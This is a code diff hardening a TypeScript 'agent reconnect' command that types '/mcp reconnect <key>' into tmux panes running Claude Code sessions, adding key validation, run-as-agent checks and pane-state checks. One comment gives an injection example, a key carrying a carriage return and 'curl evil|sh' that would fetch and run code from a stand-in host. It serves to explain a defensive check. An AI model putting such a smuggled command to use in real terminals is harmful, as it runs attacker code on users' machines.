@@ -7,7 +7,7 @@
  *	@Email: <Shinrai@users.noreply.github.com>
  *	-----
  *	@Last modified by: Nate Corcoran <CLDMV> (Shinrai@users.noreply.github.com)
- *	@Last modified time: 2026-11-21T11:36:59-08:00 (1795289819)
+ *	@Last modified time: 2026-11-21T12:03:41-08:00 (1795291421)
  *	-----
  *	@Copyright: Copyright (c) 2013-2026 Catalyzed Motivation Inc. All rights reserved.
  *
@@ -18,15 +18,27 @@
  * session of a registered agent (or one agent). The key is the agent's actual `mcpServers` entry
  * for the broker, read back from its `.claude.json` files — mcp-config.ts writes those entries, so
  * brokerKeyOf knows what one looks like wherever it is. The sessions are found as root through
- * every tmux server the agent user runs (src/cli/tmux.ts), without the user's server-access ACL.
- * A pane is only sent to when its composer is empty and Claude isn't working, so nothing being
- * typed is clobbered; skipped panes are listed with their id so they can be retried. Every effect
- * is injected.
+ * every tmux server the agent user runs (src/cli/tmux.ts), but every tmux command runs AS THE
+ * AGENT, so root never types into a server the agent itself couldn't reach. Nothing is typed into
+ * a pane unless its composer is visibly empty, Claude is working in the foreground of it, the key
+ * is one that can't carry a newline or shell metacharacter, and the screen is re-captured just
+ * before sending; skipped panes are listed with their id and a reason so they can be retried.
+ * Every effect is injected.
  */
 import { agentsDir, assertAgentName, registeredAgents, type Group, type UserInfo } from "./agents.ts";
 import { brokerKeyOf, extraFolders, inFolder, MCP_FILE, type FolderIo, type Place } from "./mcp-config.ts";
 import type { Pane } from "./tmux.ts";
 import type { ConfigLayer } from "./config-merge.ts";
+
+export const RECONNECT_HELP = `agent reconnect [<user>] [--dry-run]
+
+Sends "/mcp reconnect <key>" to every running Claude Code session of a
+registered agent (or all of them): the sessions the broker restart drops.
+<key> is the agent's actual mcpServers entry for the broker, read back from
+its .claude.json files. A pane is skipped, with its id and the reason, when
+someone is typing in it, Claude is working in it, it is in copy mode, or its
+key is not one that is safe to type blind. --dry-run lists what it would
+send where.`;
 
 /** The effects `agent reconnect` (and `upgrade`'s last step) use. */
 export interface ReconnectDeps {
@@ -35,61 +47,100 @@ export interface ReconnectDeps {
 	groups: () => Group[];
 	userInfo: (user: string) => UserInfo | undefined;
 	mcpIO: FolderIo;
-	/** The tmux sockets the user's tmux servers listen on. */
-	tmuxSockets: (uid: number) => string[];
-	/** The Claude Code panes on one tmux server. */
-	tmuxPanes: (socket: string) => Pane[];
-	/** Send literal text to a pane and press Enter (tmux send-keys -l for the text, a separate Enter). */
-	tmuxSend: (socket: string, pane: string, text: string) => void;
-	/** The CLAUDE_CONFIG_DIR of a running process, when it has one. */
-	paneConfigDir: (pid: number) => string | undefined;
+	/** The tmux sockets the user's tmux servers listen on (each verified as the agent's own). */
+	tmuxSockets: (info: UserInfo) => string[];
+	/** The Claude Code panes on one tmux server, with their screen and foreground/mode state. */
+	tmuxPanes: (socket: string, info: UserInfo) => Pane[];
+	/** Re-capture one pane's screen right before sending; undefined when the pane is gone. */
+	tmuxPaneText: (socket: string, pane: string, info: UserInfo) => string | undefined;
+	/** Send literal text to a pane as the agent and press Enter (tmux send-keys -l, then a separate Enter). */
+	tmuxSend: (socket: string, pane: string, text: string, info: UserInfo) => void;
 }
 
 /**
- * Heuristics over Claude Code's screen, from the captured pane text. The TUI changes between
- * versions, so they err toward skipping a pane: one is only sent to when its input line is
- * visibly empty and nothing suggests Claude is working. A skipped pane is listed with its id,
- * so it can be retried.
+ * Heuristics over Claude Code's screen, from the captured pane text (real captures of the current
+ * TUI are the test fixtures). The TUI changes between versions, so they err toward skipping a
+ * pane: one is only sent to when its input line is visibly empty and nothing suggests Claude is
+ * working. A skipped pane is listed with its id, so it can be retried.
  */
 
-/** Claude Code's working-indicator line: a spinner glyph, an action and an ellipsis, optionally with a parenthetical ("✻ Fixing things… (esc to interrupt · 32s)"). */
-const WORKING = /^[^\w\s>!#] .+…(?: \([^)]*\))?$/;
+/** Spinner glyphs Claude Code's working indicator uses (✻✽✳✶✷✸✹✢✦ and the thin ·), starting a line of text. */
+const SPINNER = /^\s*[✻✽✳✶✷✸✹✢✦·]\s*\S/;
+/** A finished turn's banner ("✻ Baked for 29s · done 9:55 AM") — a spinner glyph, but not working. */
+const DONE_BANNER = /· done\b/;
 
-/** Whether Claude Code is busy in the pane: a working-indicator line, or the "esc to interrupt" hint it shows while working. */
+/**
+ * Whether Claude Code is busy in the pane: a spinner-glyph line that isn't a finished-turn banner
+ * (the current TUI's working line, "✻ Waiting for 1 background agent to finish", carries no
+ * ellipsis and no "esc to interrupt"), or the "esc to interrupt" hint older versions show. With
+ * -J the capture joins a wrapped indicator line; a glyph line's first fragment still matches even
+ * unjoined, so a narrow pane reads as busy either way.
+ */
 export function busyPane(text: string): boolean {
 	return text.split("\n").some((line) => {
 		const l = line.replace(/\s+$/, "");
-		return l.includes("esc to interrupt") || WORKING.test(l);
+		return /esc to interrupt/i.test(l) || (SPINNER.test(l) && !DONE_BANNER.test(l));
 	});
 }
 
-/** The state of Claude Code's input line in the pane: "empty" (a "> " line with nothing typed), "typing" (text in it) or "none" (no input line on screen — a dialog, or a bash/memory pane with no transcript "> " line; a bash pane whose transcript shows a "> " reads "typing", which errs toward skipping — safe either way). */
+/** The composer box's rule line ("────"). */
+const RULE = /^\s*─+\s*$/;
+/** Footer and widget lines under the box ("⏵⏵ accept edits on …", "? for shortcuts", "● main" tasks). */
+const FOOTER = /^\s*[?⏵●◯]/;
+
+/**
+ * The state of Claude Code's input line in the pane: "empty" (a "❯"/"> " line with nothing typed),
+ * "typing" (text in it, or any non-blank line between it and the box's closing rule — a draft can
+ * start with a blank first line), or "none" (no input line on screen — a dialog, or bash/memory
+ * input mode). The live box is the bottom-most prompt line: user messages in the transcript carry
+ * a "❯" too, but the box sits under them. A shell's PS2 continuation ("> ") can only show while
+ * the shell owns the tty, in which case no claude is the pane's foreground job — the foreground
+ * check catches that pane even when this reads "empty".
+ */
 export function composerState(text: string): "empty" | "typing" | "none" {
-	const lines = text.split("\n");
-	// The input line is the bottom-most ">" line: user messages in the transcript carry a ">" too,
-	// but the input line sits under them (and is what a skip must protect).
+	const lines = text.split("\n").map((l) => l.replace(/\s+$/, ""));
 	for (let i = lines.length - 1; i >= 0; i--) {
-		const m = /^>(?: (.*))?$/.exec(lines[i]!.replace(/\s+$/, ""));
+		const m = /^[❯>](?: (.*))?$/.exec(lines[i]!);
 		if (!m) continue;
+		for (let j = i + 1; j < lines.length; j++) {
+			const below = lines[j]!;
+			if (RULE.test(below) || FOOTER.test(below)) break;
+			if (below.trim() !== "") return "typing";
+		}
 		return m[1]?.trim() ? "typing" : "empty";
 	}
 	return "none";
 }
 
-/** Split `agent reconnect` arguments into the agent users (at most one) and --dry-run. */
-function parseReconnectArgs(rest: string[]): { users: string[]; dryRun: boolean } {
+/**
+ * A key that is safe to type blind into a pane: alphanumerics, "_", "." and "-", at most 64
+ * characters. The agent controls its `mcpServers` key names, and send-keys -l delivers CR/LF as
+ * Enter — a key like "github\r!curl evil|sh" would submit the reconnect and then run a command.
+ */
+export const safeKey = (key: string): boolean => /^[A-Za-z0-9_.-]{1,64}$/.test(key);
+
+/** Control characters never reach root's terminal in a log line: a socket path or pane id carrying them is blanked out. */
+const clean = (s: string): string => s.replace(/[\x00-\x1f\x7f]/g, "?");
+
+/** Split `agent reconnect` arguments into the agent users (at most one), --dry-run and --help. */
+function parseReconnectArgs(rest: string[]): { users: string[]; dryRun: boolean; help: boolean } {
 	const users: string[] = [];
 	let dryRun = false;
+	let help = false;
 	for (const a of rest) {
 		if (a === "--dry-run") dryRun = true;
+		else if (a === "-h" || a === "--help") help = true;
 		else if (a.startsWith("-")) throw new Error(`unknown flag: ${a}`);
 		else users.push(a);
 	}
 	if (users.length > 1) throw new Error("name at most one agent user: sudo gh-broker agent reconnect [<user>]");
-	return { users, dryRun };
+	return { users, dryRun, help };
 }
 
-/** The broker key in each of the agent's `.claude.json` files that has one, by folder. */
+/**
+ * The broker key in each of the agent's `.claude.json` files that has one, by folder. A folder
+ * root won't read (SkippedFolder) or an unreadable file contributes no key.
+ */
 function keysOf(places: Place[], info: UserInfo, dir: string, d: { mcpIO: FolderIo }): Map<string, string> {
 	const keys = new Map<string, string>();
 	for (const place of places) {
@@ -97,15 +148,19 @@ function keysOf(places: Place[], info: UserInfo, dir: string, d: { mcpIO: Folder
 			const key = inFolder(place, info, d, (io) => brokerKeyOf(io.read(`${place.folder}/${MCP_FILE}`, info.uid)?.text, dir));
 			if (key) keys.set(place.folder, key);
 		} catch {
-			// a folder root won't use (SkippedFolder), or an unreadable file: it contributes no key
+			// the folder can't be used: it contributes no key
 		}
 	}
 	return keys;
 }
 
-/** The key to send to a pane: the one in the session's own config folder's file, else the home file's, else any of the agent's files'. */
+/**
+ * The key to send to a pane: the one in the session's own config folder's file, else the home
+ * file's. A pane whose own session folder has no broker entry is skipped, not guessed at — some
+ * other folder's key may be wrong for that session.
+ */
 function keyFor(pane: Pane, info: UserInfo, keys: Map<string, string>): string | undefined {
-	return (pane.configDir && keys.get(pane.configDir)) || keys.get(info.home) || [...keys.values()][0];
+	return (pane.configDir && keys.get(pane.configDir)) || keys.get(info.home);
 }
 
 /**
@@ -113,7 +168,11 @@ function keyFor(pane: Pane, info: UserInfo, keys: Map<string, string>): string |
  * there were none), 1 when any pane was skipped or a user is missing.
  */
 export function reconnect(rest: string[], config: ConfigLayer, d: ReconnectDeps): number {
-	const { users, dryRun } = parseReconnectArgs(rest);
+	const { users, dryRun, help } = parseReconnectArgs(rest);
+	if (help) {
+		d.log(RECONNECT_HELP);
+		return 0;
+	}
 	const dir = agentsDir(config.listen);
 	const registered = registeredAgents(d.groups()).map((a) => a.user);
 	for (const user of users) {
@@ -122,6 +181,10 @@ export function reconnect(rest: string[], config: ConfigLayer, d: ReconnectDeps)
 	}
 	let sent = 0;
 	let skipped = 0;
+	const skip = (user: string, socket: string, pane: string, key: string | undefined, why: string): void => {
+		d.log(`${user} ${clean(socket)} ${clean(pane)} ${key ?? "-"} skipped (${why})`);
+		skipped++;
+	};
 	for (const user of users.length ? users : registered) {
 		const info = d.userInfo(user);
 		if (!info) {
@@ -132,59 +195,71 @@ export function reconnect(rest: string[], config: ConfigLayer, d: ReconnectDeps)
 		const places: Place[] = [{ folder: info.home, saved: false }, ...extraFolders(info, d, config, user)];
 		const keys = keysOf(places, info, dir, d);
 		let panes = 0;
-		const sockets = d.tmuxSockets(info.uid);
+		const sockets = d.tmuxSockets(info);
 		for (const socket of sockets) {
-			for (const pane of d.tmuxPanes(socket)) {
+			for (const pane of d.tmuxPanes(socket, info)) {
 				panes++;
+				if (pane.inMode) {
+					skip(user, socket, pane.id, undefined, "pane is in copy mode");
+					continue;
+				}
+				if (pane.synchronized) {
+					skip(user, socket, pane.id, undefined, "synchronize-panes is on");
+					continue;
+				}
+				// tmux pane ids are %<number>; anything else from the (agent-controlled) server is
+				// not typed at, and only its cleaned form reaches the log.
+				if (!/^%\d+$/.test(pane.id)) {
+					skip(user, socket, pane.id, undefined, "unsafe pane id");
+					continue;
+				}
 				const key = keyFor(pane, info, keys);
 				if (!key) {
-					d.log(`${user} ${socket} ${pane.id} - skipped (no broker MCP entry in its .claude.json files)`);
-					skipped++;
+					skip(user, socket, pane.id, undefined, "no broker MCP entry in its .claude.json files");
+					continue;
+				}
+				if (!safeKey(key)) {
+					skip(user, socket, pane.id, undefined, "unsafe MCP key");
+					continue;
+				}
+				if (!pane.foreground) {
+					skip(user, socket, pane.id, key, "claude is not the pane's foreground job");
 					continue;
 				}
 				if (busyPane(pane.text)) {
-					d.log(`${user} ${socket} ${pane.id} ${key} skipped (busy: Claude is working)`);
-					skipped++;
+					skip(user, socket, pane.id, key, "busy: Claude is working");
 					continue;
 				}
 				const composer = composerState(pane.text);
-				if (composer === "typing") {
-					d.log(`${user} ${socket} ${pane.id} ${key} skipped (composer not empty)`);
-					skipped++;
-					continue;
-				}
-				if (composer === "none") {
-					d.log(`${user} ${socket} ${pane.id} ${key} skipped (no Claude Code prompt on screen)`);
-					skipped++;
+				if (composer !== "empty") {
+					skip(user, socket, pane.id, key, composer === "typing" ? "composer not empty" : "no Claude Code prompt on screen");
 					continue;
 				}
 				if (dryRun) {
-					d.log(`${user} ${socket} ${pane.id} ${key} would send`);
+					d.log(`${user} ${clean(socket)} ${clean(pane.id)} ${key} would send`);
 				} else {
-					// Re-capture this pane right before sending: the upfront capture can be
-					// stale by the time this pane's turn comes (earlier panes' sends, the key
-					// lookups), and the check is moment-to-moment — a pane can still change
-					// between this check and the two send-keys (tmux has no atomic
-					// check-and-send), which is why skipped panes are listed for retry.
-					const fresh = d.tmuxPanes(socket).find((p) => p.id === pane.id);
-					if (!fresh) {
-						d.log(`${user} ${socket} ${pane.id} ${key} skipped (pane gone since capture)`);
-						skipped++;
+					// Re-capture between the check and the send: the operator may have started
+					// typing (or the pane died) while the checks ran.
+					const fresh = d.tmuxPaneText(socket, pane.id, info);
+					if (fresh === undefined) {
+						skip(user, socket, pane.id, key, "gone since capture");
 						continue;
 					}
-					if (busyPane(fresh.text) || composerState(fresh.text) !== "empty") {
-						d.log(`${user} ${socket} ${pane.id} ${key} skipped (changed since capture: ${busyPane(fresh.text) ? "busy" : `composer ${composerState(fresh.text)}`})`);
-						skipped++;
+					if (busyPane(fresh)) {
+						skip(user, socket, pane.id, key, "busy since capture");
+						continue;
+					}
+					if (composerState(fresh) !== "empty") {
+						skip(user, socket, pane.id, key, "changed since capture");
 						continue;
 					}
 					try {
-						d.tmuxSend(socket, pane.id, `/mcp reconnect ${key}`);
+						d.tmuxSend(socket, pane.id, `/mcp reconnect ${key}`, info);
 					} catch (err) {
-						d.log(`${user} ${socket} ${pane.id} ${key} skipped (send failed: ${(err as Error).message})`);
-						skipped++;
+						skip(user, socket, pane.id, key, `send failed: ${(err as Error).message}`);
 						continue;
 					}
-					d.log(`${user} ${socket} ${pane.id} ${key} sent`);
+					d.log(`${user} ${clean(socket)} ${clean(pane.id)} ${key} sent`);
 				}
 				sent++;
 			}
